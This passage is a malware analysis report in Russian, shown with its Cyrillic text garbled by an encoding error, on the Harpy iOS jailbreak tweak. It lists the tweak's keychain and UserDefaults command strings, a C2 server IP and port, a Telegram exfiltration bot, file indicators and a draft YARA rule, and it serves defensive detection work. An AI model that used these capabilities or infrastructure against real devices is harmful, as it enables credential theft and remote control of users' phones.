| –ê–¥—Ä–µ—Å | –§—É–Ω–∫—Ü–∏—è | –û–ø–∏—Å–∞–Ω–∏–µ |
|-------|---------|----------|
| 0x4BBB8 | sub_4BBB8 | –û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ State |
| 0x4BA88 | sub_4BA88 | –î–æ—Å—Ç—É–ø –∫ State |
| 0xCF20 | sub_CF20 | Type metadata accessor |
| 0xCF64 | sub_CF64 | Protocol conformance |

---

## üì¶ –ò–º–ø–æ—Ä—Ç—ã –∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏

### Swift Runtime

| –°–∏–º–≤–æ–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|--------|------------|
| `swift_allocObject` | –ê–ª–ª–æ–∫–∞—Ü–∏—è –æ–±—ä–µ–∫—Ç–æ–≤ |
| `swift_release` / `swift_retain` | ARC —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ |
| `swift_bridgeObjectRetain` | Bridge object retain |
| `swift_getObjCClassMetadata` | ObjC interop |
| `swift_getOpaqueTypeConformance` | Protocol conformance |
| `swift_once` | Thread-safe initialization |
| `swift_unexpectedError` | Error handling |

### Foundation

| –°–∏–º–≤–æ–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|--------|------------|
| `NSUserDefaults` | –•—Ä–∞–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ |
| `NSFileManager` | –†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏ |
| `NSRegularExpression` | –ü–∞—Ä—Å–∏–Ω–≥ regex |
| `NSPredicate` | CoreData –∑–∞–ø—Ä–æ—Å—ã |
| `NSData` | –ë–∏–Ω–∞—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ |

### Security.framework

| –°–∏–º–≤–æ–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|--------|------------|
| `SecItemDelete` | –£–¥–∞–ª–µ–Ω–∏–µ –∏–∑ Keychain |
| `SecItemCopyMatching` | –ß—Ç–µ–Ω–∏–µ Keychain |
| `SecItemUpdate` | –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ Keychain |

### Network.framework

| –°–∏–º–≤–æ–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|--------|------------|
| `NWConnection` | TCP —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ |
| `NWEndpoint` | Endpoint (host:port) |
| `NWParameters` | –ü–∞—Ä–∞–º–µ—Ç—Ä—ã —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è |

### SwiftUI

| –°–∏–º–≤–æ–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|--------|------------|
| `State.wrappedValue` | Property wrapper |
| `EnvironmentObject` | DI –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä |
| `NavigationView` | –ù–∞–≤–∏–≥–∞—Ü–∏—è |
| `Button` | –ö–Ω–æ–ø–∫–∏ |
| `Image` | –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è |

---

## üìù –ö–ª—é—á–µ–≤—ã–µ —Å—Ç—Ä–æ–∫–∏ –∏ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã

### DSL –∫–æ–º–∞–Ω–¥—ã

```
.harpy.edit.userdefaults      (0x50990)
.harpy.remove.userdefaults    (0x509b0)
.harpy.clear.userdefaults     (0x509d0)
.harpy.read.userdefaults      (0x509f0)
.harpy.edit.keychain          (0x50a10)
.harpy.remove.keychain        (0x50a30)
.harpy.read.keychain          (0x50a50)
.harpy.update.coredata        (0x50a70)
.harpy.update.server          (0x50a90)
.harpy.write.file             (0x50ab0)
.harpy.print(message:         (0x50ad0)
.harpy.execute(script:        (0x50af0)
```

### Regex –ø–∞—Ç—Ç–µ—Ä–Ω—ã

```
\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$  (0x50bc0)
sleep:(\+\d\)                 (–ø–∞—Ä—Å–∏–Ω–≥ –∑–∞–¥–µ—Ä–∂–∫–∏)
```

### –°–æ–æ–±—â–µ–Ω–∏—è

```
"Keychain –∫–ª—é—á —É–¥–∞–ª–µ–Ω: "      (0x50c10)
"Keychain –æ–±–Ω–æ–≤–ª–µ–Ω: "         (0x50c40)
"–ù–µ—Ç –∑–∞–ø–∏—Å–µ–π –≤ Keychain"      (0x50d40)
"–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø–æ–≤—Ç–æ—Ä..."       (0x50513)
"For Developers"              (—Ç–µ–∫—Å—Ç —Å–µ–∫—Ü–∏–∏)
"HarpyTeam"                   (–ø–æ–¥–ø–∏—Å—å)
```

### URLs

```
https://i.ibb.co/SKYxFp1/logos.png     (0x50700)
https://t.me/harpyapp_bot
https://t.me/harpysupport
https://t.me/harpyapp
https://t.me/lurizevl
https://t.me/imharpy
```

### –§–∞–π–ª—ã

```
harpyconfig.txt               (—Ñ–∞–π–ª –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏)
harpy.dylib                   (–ø—É—Ç—å —É—Å—Ç–∞–Ω–æ–≤–∫–∏)
.txt                          (—Ñ–∏–ª—å—Ç—Ä —Å–∫—Ä–∏–ø—Ç–æ–≤)
```

---

## üö® –ò–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ (IoC)

### Network IoC

| –¢–∏–ø | –ó–Ω–∞—á–µ–Ω–∏–µ | –û–ø–∏—Å–∞–Ω–∏–µ |
|-----|----------|----------|
| IP | `92.246.138.114` | C2 —Å–µ—Ä–≤–µ—Ä |
| Port | `4001/tcp` | C2 –ø–æ—Ä—Ç |
| Domain | `t.me/harpyapp_bot` | Telegram exfiltration |
| URL | `i.ibb.co/SKYxFp1/logos.png` | Payload indicator |

### File IoC

| –ü—É—Ç—å | –û–ø–∏—Å–∞–Ω–∏–µ |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | –û—Å–Ω–æ–≤–Ω–æ–π –º–æ–¥—É–ª—å |
| `Documents/harpyconfig.txt` | –§–∞–π–ª –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ |
| `*.txt` –≤ Documents | –°–∫—Ä–∏–ø—Ç—ã Harpy |

### Behavioral IoC

- –û–±—Ä–∞—â–µ–Ω–∏–µ –∫ `NSUserDefaults.standardUserDefaults`
- –í—ã–∑–æ–≤—ã `SecItemDelete`, `SecItemUpdate`
- TCP —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –Ω–∞ –ø–æ—Ä—Ç 4001
- –ó–∞–≥—Ä—É–∑–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π —Å `ibb.co`
- Regex –ø–∞—Ä—Å–∏–Ω–≥ —Å –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º–∏ `.harpy.*`

### YARA Rule (Draft)

```yara
rule Harpy_iOS_Tweak {
    meta:
        description = "Harpy iOS jailbreak tweak"
        author = "Reverse Engineer"
        
    strings:
        $c2_ip = "92.246.138.114"
        $c2_port = { 01 10 00 00 }  // 4001 little-endian
        $cmd1 = ".harpy.edit.userdefaults"
        $cmd2 = ".harpy.remove.keychain"
        $cmd3 = ".harpy.update.coredata"
        $telegram = "harpyapp_bot"
        $logo_url = "i.ibb.co/SKYxFp1"
        
    condition:
        (uint32(0) == 0xFEEDFACF) and  // Mach-O 64-bit
        ($c2_ip or $telegram) and
        2 of ($cmd*)
}
```

---

## üìä –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

**Harpy** –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Å–ª–æ–∂–Ω—ã–π iOS jailbreak-—Ç–≤–∏–∫ —Å:

1. **–ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã–º —Å–∫—Ä–∏–ø—Ç–æ–≤—ã–º DSL** –¥–ª—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
2. **C2 –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–æ–π** –¥–ª—è —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
3. **–¢–µ–ª–µ–º–µ—Ç—Ä–∏–µ–π —á–µ—Ä–µ–∑ Telegram** –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
4. **SwiftUI –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º** –¥–ª—è —É–¥–æ–±–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è

### –£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã: üî¥ –í–´–°–û–ö–ò–ô

- –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ Keychain
- –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è UserDefaults –ª—é–±–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è  
- –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
- –≠–∫—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ Telegram

---

*–û—Ç—á—ë—Ç —Å–æ–∑–¥–∞–Ω –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –ø–æ–ª–Ω–æ–≥–æ —Ä–µ–≤–µ—Ä—Å-–∏–Ω–∂–∏–Ω–∏—Ä–∏–Ω–≥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º IDA Pro + MCP*

### ‚ö†Ô∏è –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ —Ä–∏—Å–∫–∏

1. **Data exfiltration** ‚Äî –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ C2-—Å–µ—Ä–≤–µ—Ä (92.246.138.114:4001) –∏ Telegram
2. **Keychain manipulation** ‚Äî –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ Keychain —á–µ—Ä–µ–∑ Security.framework
3. **Persistence** ‚Äî –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –≤ —Ñ–∞–π–ª–æ–≤—É—é —Å–∏—Å—Ç–µ–º—É
4. **No encryption** ‚Äî –°–∫—Ä–∏–ø—Ç—ã —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ
5. **Remote command execution** ‚Äî –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —É–¥–∞–ª—ë–Ω–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
6. **UserDefaults tampering** ‚Äî –ú–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ª—é–±–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

---

### üõ°Ô∏è Indicators of Compromise (IOC)

#### –°–µ—Ç–µ–≤—ã–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã:
| –¢–∏–ø | –ó–Ω–∞—á–µ–Ω–∏–µ |
|-----|----------|
| **IP** | `92.246.138.114` |
| **Port** | `4001/tcp` |
| **Domain** | `t.me/harpyapp_bot` |

#### –§–∞–π–ª–æ–≤—ã–µ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã:
| –ü—É—Ç—å | –û–ø–∏—Å–∞–Ω–∏–µ |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | –û—Å–Ω–æ–≤–Ω–æ–π –±–∏–Ω–∞—Ä–Ω–∏–∫ |
| `Documents/harpyconfig.txt` | –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–∫—Ä–∏–ø—Ç–æ–≤ |

#### –°—Ç—Ä–æ–∫–∏:
```
"Data logging in telegram bot"
".harpy.edit.userdefaults"
".harpy.remove.keychain"
"harpyapp_bot"
"Keychain –∫–ª—é—á —É–¥–∞–ª–µ–Ω"
```

---

### üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞

- **–§—É–Ω–∫—Ü–∏–π**: ~900+
- **–ò–º–ø–æ—Ä—Ç–æ–≤**: 300+ (Foundation, UIKit, SwiftUI, Security, CoreData, Network)
- **–°—Ç—Ä–æ–∫**: 500+ (–≤–∫–ª—é—á–∞—è Swift metadata)
- **–°–µ–≥–º–µ–Ω—Ç–æ–≤**: 35 (—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è Mach-O —Å—Ç—Ä—É–∫—Ç—É—Ä–∞)

---

### üì¶ –ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ Frameworks

| Framework | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|-----------|------------|
| **Foundation** | NSUserDefaults, NSFileManager, NSData, JSONDecoder |
| **UIKit** | UIImage, UIWindow |
| **SwiftUI** | –ü–æ–ª–Ω—ã–π UI (Button, Text, NavigationLink, State, Binding) |
| **Security** | SecItemCopyMatching, SecItemDelete, SecItemUpdate (Keychain) |
| **CoreData** | NSManagedObjectContext, NSPredicate, NSFetchRequest |
| **Network** | NWConnection, NWEndpoint (TCP –∫ C2-—Å–µ—Ä–≤–µ—Ä—É) |
| **Combine** | Published, ObservableObject, StateObject |
| **CydiaSubstrate** | MSHookMessageEx, MSHookFunction (runtime hooking) |

---

### üî¨ –ú–µ—Ç–æ–¥–æ–ª–æ–≥–∏—è –∞–Ω–∞–ª–∏–∑–∞

1. **IDA Pro 8.x** ‚Äî —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ ARM64e Mach-O
2. **Hex-Rays Decompiler** ‚Äî –¥–µ–∫–æ–º–ø–∏–ª—è—Ü–∏—è –≤ –ø—Å–µ–≤–¥–æ–∫–æ–¥ Swift/ObjC
3. **Swift Demangler** ‚Äî —Ä–∞–∑–±–æ—Ä Swift symbol names
4. **–°—Ç—Ä–æ–∫–æ–≤–æ–π –∞–Ω–∞–ª–∏–∑** ‚Äî –ø–æ–∏—Å–∫ URL, IP, –ø—É—Ç–µ–π, –∫–æ–º–∞–Ω–¥
5. **Cross-reference –∞–Ω–∞–ª–∏–∑** ‚Äî –ø–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ call graph

---

### üìù –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

**harpy_fixed_v3.dylib** ‚Äî —ç—Ç–æ –ø—Ä–æ–¥–≤–∏–Ω—É—Ç—ã–π iOS jailbreak tweak —Å:
- –ü–æ–ª–Ω–æ—Ü–µ–Ω–Ω—ã–º C2-–∫–∞–Ω–∞–ª–æ–º –¥–ª—è —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
- Telegram-–±–æ—Ç–æ–º –¥–ª—è —ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö  
- –°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–º DSL –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –∞—Ç–∞–∫
- –î–æ—Å—Ç—É–ø–æ–º –∫ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–º —Ö—Ä–∞–Ω–∏–ª–∏—â–∞–º (Keychain, CoreData)

–ü—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–µ—Ä—å—ë–∑–Ω—É—é —É–≥—Ä–æ–∑—É –¥–ª—è –ø—Ä–∏–≤–∞—Ç–Ω–æ—Å—Ç–∏ –∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π jailbroken —É—Å—Ç—Ä–æ–π—Å—Ç–≤.

---

*–ê–Ω–∞–ª–∏–∑ –≤—ã–ø–æ–ª–Ω–µ–Ω: –î–µ–∫–∞–±—Ä—å 2025*
